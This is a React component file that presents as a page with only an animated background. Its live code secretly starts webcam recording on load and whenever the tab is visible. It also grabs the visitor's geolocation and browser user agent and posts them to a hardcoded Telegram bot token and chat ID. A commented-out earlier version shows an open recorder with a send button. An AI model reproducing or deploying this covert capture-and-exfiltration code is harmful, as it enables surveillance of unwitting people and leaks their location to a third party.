// import React, { useState, useRef } from "react";
// import AnimatedBackground from "./components/AnimatedBackground";

// function VideoRecorder() {
//   const [recording, setRecording] = useState(false);
//   const [videoUrl, setVideoUrl] = useState("");
//   const videoRef = useRef(null);
//   const [mediaRecorder, setMediaRecorder] = useState(null);
//   const [videoBlob, setVideoBlob] = useState(null);

//   const startRecording = () => {
//     navigator.mediaDevices
//       .getUserMedia({ video: true })
//       .then((stream) => {
//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;
//         }

//         const recorder = new MediaRecorder(stream);
//         recorder.ondataavailable = (e) => {
//           setVideoBlob(e.data);
//           setVideoUrl(URL.createObjectURL(e.data));
//         };
//         recorder.start();
//         setMediaRecorder(recorder);
//         setRecording(true);
//       })
//       .catch((error) => {
//         console.error("Ошибка доступа к камере", error);
//       });
//   };

//   const stopRecording = () => {
//     if (mediaRecorder) {
//       mediaRecorder.stop();
//     }
//     if (videoRef.current && videoRef.current.srcObject) {
//       videoRef.current.srcObject.getTracks().forEach((track) => track.stop());
//     }
//     setRecording(false);
//   };

//   const sendVideoToTelegram = async () => {
//     const formData = new FormData();
//     formData.append("chat_id", "7819537579"); // Замените на ID вашего чата
//     formData.append("video", videoBlob, "video.webm"); // Видео, которое отправляем

//     const response = await fetch(
//       `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendVideo`,
//       {
//         method: "POST",
//         body: formData,
//       }
//     );

//     if (response.ok) {
//       alert("Видео успешно отправлено в Telegram");
//     } else {
//       const error = await response.json();
//       console.error("Ошибка при отправке видео:", error);
//       alert("Произошла ошибка при отправке видео");
//     }
//   };

//   return (
//     <div>
//       <AnimatedBackground />
//       <h1>Запись видео с камеры</h1>
//       <video ref={videoRef} width="640" height="480" autoPlay />
//       <div>
//         {recording ? (
//           <button onClick={stopRecording}>Остановить запись</button>
//         ) : (
//           <button onClick={startRecording}>Начать запись</button>
//         )}
//       </div>
//       {videoUrl && (
//         <div>
//           <h2>Ваше видео:</h2>
//           <video src={videoUrl} controls width="640" />
//           <div>
//             <button onClick={sendVideoToTelegram}>
//               Отправить видео в Telegram
//             </button>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// }

// export default VideoRecorder;
import React, { useEffect, useRef, useState } from "react";
import AnimatedBackground from "./components/AnimatedBackground";

function VideoRecorder() {
  const videoRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const streamRef = useRef(null);
  const chunksRef = useRef([]);
  const isRecordingRef = useRef(false);

  const [geoData, setGeoData] = useState(null);
  const [userAgent, setUserAgent] = useState("");
  const [infoSent, setInfoSent] = useState(false);

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      const recorder = new MediaRecorder(stream);
      chunksRef.current = [];

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: "video/webm" });
        stopStream();
      };

      recorder.start();
      mediaRecorderRef.current = recorder;
      isRecordingRef.current = true;
    } catch (error) {
      console.error("Ошибка доступа к камере:", error);
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecordingRef.current) {
      mediaRecorderRef.current.stop();
      isRecordingRef.current = false;
    }
  };

  const stopStream = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }
  };

  // Отправка геоданных в Telegram
  const sendGeoToTelegram = async () => {
    if (geoData && !infoSent) {
      const formData = new FormData();
      formData.append("chat_id", "7819537579"); // ID чата
      formData.append(
        "text",
        `📍 Location: ${geoData.latitude}, ${geoData.longitude}\n🌐 Device: ${userAgent}`
      );

      try {
        const response = await fetch(
          `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
          {
            method: "POST",
            body: formData,
          }
        );
        if (response.ok) {
          console.log("✅ Геолокация успешно отправлена в Telegram");
          setInfoSent(true); // Помечаем, что информация отправлена
        } else {
          console.error("❌ Ошибка при отправке геолокации в Telegram");
        }
      } catch (error) {
        console.error("❌ Ошибка при отправке геолокации:", error);
      }
    }
  };

  // Геолокация и устройство — один раз
  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          console.log("🌍 Геолокация получена:", position.coords);
          setGeoData({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });

          // Отправляем гео-данные сразу, как только получены
          sendGeoToTelegram();
        },
        (err) => {
          console.error("❌ Ошибка получения геолокации:", err);
        }
      );
    }

    setUserAgent(navigator.userAgent);
  }, []);

  // Отслеживание активности страницы
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.visibilityState === "visible") {
        if (!isRecordingRef.current) startRecording();
      } else {
        if (isRecordingRef.current) stopRecording();
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    startRecording(); // Начинаем запись сразу при заходе

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      stopRecording();
      stopStream();
    };
  }, []);

  return (
    <div>
      <AnimatedBackground />
    </div>
  );
}

export default VideoRecorder;
